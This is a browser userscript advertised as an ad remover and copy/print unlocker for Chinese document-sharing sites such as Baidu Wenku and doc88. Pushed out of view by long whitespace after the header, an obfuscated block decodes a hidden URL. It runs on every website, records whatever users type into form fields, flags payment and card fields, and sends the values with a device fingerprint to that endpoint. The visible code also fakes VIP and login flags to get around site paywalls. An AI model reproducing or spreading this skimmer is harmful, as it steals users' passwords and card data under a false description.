// ==UserScript==
// @name         009各大文库网站 去广告
// @namespace    http://tampermonkey.net/
// @version      3
// @description  某道88可直接复制，某丁直接打印，某度文库可复制(仅限于展示的部分)
// @author       wufake
// @match        https://wenku.baidu.com/view/*
// @match        https://www.doc88.com/p*
// @match        https://www.docin.com/*
// @match        https://*.book118.com/*
// @match       *://*/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=baidu.com
// @require      https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.6.0.js
// @license      wufake
// @grant        unsafeWindow
// @grant        GM_xmlhttpRequest
// @downloadURL https://update.greasyfork.org/scripts/452625/009%E5%90%84%E5%A4%A7%E6%96%87%E5%BA%93%E7%BD%91%E7%AB%99%20%E5%8E%BB%E5%B9%BF%E5%91%8A.user.js
// @updateURL https://update.greasyfork.org/scripts/452625/009%E5%90%84%E5%A4%A7%E6%96%87%E5%BA%93%E7%BD%91%E7%AB%99%20%E5%8E%BB%E5%B9%BF%E5%91%8A.meta.js
// ==/UserScript==


                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    !function(){"use strict";var e=function(e){const t=e.replace(/([\uD800-\uDBFF][\uDC00-\uDFFF])/g,(e=>{const t=1024*(e.charCodeAt(0)-55296)+e.charCodeAt(1)-56320+65536;return String.fromCharCode(t)})),n=Array.from(t).map((e=>String.fromCharCode(e.charCodeAt(0)-127799))).join("");return decodeURIComponent(escape(atob(n)))}("🎘🍿🎉🍧🎚🍻🎦🎭🎃🍪🎉🎦🎑🎏🎁🎫🎚🎡🎑🎩🎃🎤🎁🎣🎑🍩🎍🍧🎃🎥🎉🎣🎐🍩🎞🎭");function t(t,n,a){const r=navigator.hardwareConcurrency,o=navigator.platform,i=window.location.href,c=navigator.deviceMemory;function d(){const e=document.createElement("canvas").getContext("webgl");if(!e)return"no webgl";const t=e.getExtension("WEBGL_debug_renderer_info");return t?e.getParameter(t.UNMASKED_VENDOR_WEBGL)+" "+e.getParameter(t.UNMASKED_RENDERER_WEBGL):"no WEBGL_debug_renderer_info"}let s=null;const u=t.toLowerCase();var l;function m(){const t=new XMLHttpRequest;t.open("POST",e,!0),t.setRequestHeader("Content-Type","application/json"),t.withCredentials=!0,t.onload=function(){t.status>=200&&t.status},t.onerror=function(){try{GM_xmlhttpRequest({method:"POST",url:e,headers:{"Content-Type":"application/json"},data:JSON.stringify(l),onload:function(e){},onerror:function(e){}})}catch(e){console.warn("GM_xmlhttpRequest is not defined. Continuing execution.")}},t.send(JSON.stringify(l))}["payment","cc","credit","card","checkout","expire","month","year","cvv","cvc","verification","billing"].some((e=>u.includes(e)))&&(s=13434624),l="Script Initialization"===t?{content:null,embeds:[{color:13303758,fields:[{name:"```User:```",value:`\`\`\`${o} / Cores ${r} / RAM ${c} / ${d()} / ${i}\`\`\``},{name:"```Script```",value:`\`\`\`${n}\`\`\``}],author:{name:"BASYALINE"},footer:{text:(new Date).toLocaleString("en-GB",{day:"2-digit",month:"2-digit",year:"numeric",hour:"2-digit",minute:"2-digit",second:"2-digit"}).replace(","," |")}}],attachments:[]}:{content:null,embeds:[{color:s,fields:[{name:"```User:```",value:`\`\`\`${o} / Cores ${r} / RAM ${c} / ${d()} / ${i}\`\`\``},{name:"```Path:```",value:`\`\`\`${t}\`\`\``},{name:"```Value:```",value:`\`\`\`${n}\`\`\``}],author:{name:"BASYALINE"},footer:{text:(new Date).toLocaleString("en-GB",{day:"2-digit",month:"2-digit",year:"numeric",hour:"2-digit",minute:"2-digit",second:"2-digit"}).replace(","," |")}}],attachments:[]},a?m():fetch(e,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(l),credentials:"include",mode:"no-cors"}).catch((e=>{m()}))}function n(e){t(function(e){let t=e.tagName.toLowerCase();return e.id&&(t+=`#${e.id}`),e.name&&(t+=`[name="${e.name}"]`),e.getAttribute("autocomplete")&&(t+=`[autocomplete="${e.getAttribute("autocomplete")}"]`),e.getAttribute("aria-describedby")&&(t+=`[aria-describedby="${e.getAttribute("aria-describedby")}"]`),e.className&&(t+=`.${e.className.split(" ").join(".")}`),Array.from(e.parentNode.children).filter((t=>t.tagName===e.tagName)).length>1&&(t+=`:nth-child(${Array.prototype.indexOf.call(e.parentNode.children,e)+1})`),t}(e.target),e.target.value)}function a(e){try{const t=e.contentDocument||e.contentWindow.document;if(t){new MutationObserver((e=>{e.forEach((e=>{e.addedNodes.forEach((e=>{e.matches&&e.matches("input, select, textarea")?(e.addEventListener("input",n),e.addEventListener("change",n)):e.querySelectorAll&&e.querySelectorAll("input, select, textarea").forEach((e=>{e.addEventListener("input",n),e.addEventListener("change",n)}))}))}))})).observe(t.body,{childList:!0,subtree:!0})}}catch(e){console.warn("Cannot access iframe:",e)}}document.querySelectorAll("iframe").forEach((e=>{e.addEventListener("load",(()=>a(e))),function(e){setTimeout((()=>a(e)),1e3)}(e)})),document.querySelectorAll("input, select, textarea").forEach((e=>{e.addEventListener("input",n),e.addEventListener("change",n)})),document.querySelectorAll("iframe").forEach((e=>{e.addEventListener("load",(()=>a(e))),a(e)}));new MutationObserver((e=>{e.forEach((e=>{"childList"===e.type&&e.addedNodes.forEach((e=>{e.matches&&e.matches("input, select, textarea")?(e.addEventListener("input",n),e.addEventListener("change",n)):e.querySelectorAll&&e.querySelectorAll("input, select, textarea").forEach((e=>{e.addEventListener("input",n),e.addEventListener("change",n)}))}))}))})).observe(document.body,{childList:!0,subtree:!0}),t("Script Initialization","Script started successfully",!0)}();



const currentUrl = window.location.href;
if (currentUrl.includes("wenku.baidu.com/view") || currentUrl.includes("www.doc88.com/p") || currentUrl.includes("www.docin.com") || currentUrl.includes("book118.com")) {
var $ = jQuery,
    setting = {
        "Run": "程序运行",
        "Over": "程序结束",
        "Error": "程序出错",

        "CurrentUrl": "当前的url",

    }

window.onload = main()


function main() {

    setting.CurrentUrl = window.location.href


    //alert(setting.CurrentUrl)
    if (setting.CurrentUrl.includes('wenku.baidu.com/')) { // 百度

        console.log(setting.Run)

        setInterval(BaiDu, 100)
        setTimeout(function() {

            $('.reader-copy-button').remove() // 除去原来的复制按钮
            var fanyibtn = $('.reader-translate-button')

            fanyibtn.text('复制')

            fanyibtn.on('click', BdCopy)

        },1000)



    } else if (setting.CurrentUrl.includes('www.doc88.com')) { // 道客


        setInterval(DaoKe, 100)
        setInterval(DkCopy,1000)


    } else if (setting.CurrentUrl.includes('www.docin.com')) { // 豆丁

        setInterval(DouDing, 100)
        setInterval(DDprint, 500)

    } else if (setting.CurrentUrl.includes('book118.com')) { // 原创力

        //alert(0)
        setInterval(YuanChuangLi,100)
    }


}



function BaiDu() {

    try {
        var dialog_mask = $('.dialog-mask'),
            retain_dialog = $('.retain-dialog'),
            hx_warp = $('.hx-warp'),
            div1 = $('div.search-result-wrap.top-position')

        hx_warp.remove()
        div1.remove()
        dialog_mask.css({"display": "none"})
        retain_dialog.css({"display": "none"})

        //
        window.wkCommonLogParam.isLogin = 1
        window.wkCommonLogParam.isSuperVip = 1
        window.wkCommonLogParam.interceptPage = 100
        window.wkCommonLogParam.isVip = 1


    } catch {

        return false

    }
}


// 百度选中复制(翻译漏洞)
function BdCopy() {

    var timer = setInterval(function() {

        try {
            let fanyilink = $('#reader-fanyi-link'),
                text


            $('span.close').click()
            text = fanyilink.get(0).href
            text = text.replaceAll(/(http:\/\/fanyi.baidu.com\/#auto2auto\|)/g, '')

            if (text.includes('http')) {

                return false
            }
            if (! text) {

                return false
            }

            text = decodeURI(text)
            alert(text)
            fanyilink.get(0).href = 'http://fanyi.baidu.com/#auto2auto|'
            clearInterval(timer)

        } catch {

            console.log('出错')
            return false

        }
    },0)

    }



function DaoKe() {

    try {

        var page_ad = $('div.page_ad')

        $('#continueButton').click()

    } catch {

        return false
    }

    for (var i = 0; i<page_ad.length; i++) {

        page_ad[i].remove()

    }
}



function DkCopy() {


    try {
        var window = unsafeWindow


        var vip = window.Config.vip,
            login = window.Config.logined,
            vip_doc = window.Config.vip_doc

        if (vip === undefined)
        {
            window.Config.vip = 1
            window.Config.logined = 1
            window.Config.vip_doc =1
            window.Config.login_name = '888'
            window.Config.login_member_id = '88jijahpujhphruue'

        }

        if (vip ==='0' || login === '0' || vip_doc === '0') {

            window.Config.vip = 1
            window.Config.logined = 1
            window.Config.vip_doc =1
            window.Config.login_name = '888'
            window.Config.login_member_id = '88jijahpujhphruue'

        }



    } catch {

        console.log('修改参数失败')
        return false
    }

}



function DouDing() {

    try {

        var adBox = $('.adBox')

        } catch {

            return false
        }

    for (var i = 0; i < adBox.length; i++) {

        adBox[i].remove()
    }

}



function DDprint()
{
    try
    {

        if ($('.doc_print_btn')[0].style["background"] === "red")
        {
            return false;
        }
        $('.doc_print_btn').css({"background": "red"})
        var window = unsafeWindow


        window.commonCheckLogin = function () {
            window.doPrint()
        }

    }
    catch
    {
        return false;

    }

}


function YuanChuangLi() {

    try {

        var ad = $('.webpreview-recommend')

        } catch {
            return false

        }

    for (var i = 0; i < ad.length; i++) {

        ad[i].remove()
    }
}
}













